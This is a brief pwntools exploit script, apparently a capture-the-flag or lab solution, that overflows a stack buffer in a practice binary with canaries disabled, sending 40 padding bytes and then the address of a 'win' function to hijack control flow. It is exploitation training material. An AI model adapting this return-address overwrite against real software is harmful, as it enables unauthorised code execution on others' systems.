#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("../canary_disabled")

gs = '''
b *main+79
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses
win = 0x4011b6

# Functions

io = start()

p = b"A"*40
p += p64(win)


io.recvuntil(b">>")
io.send(p)

io.interactive()
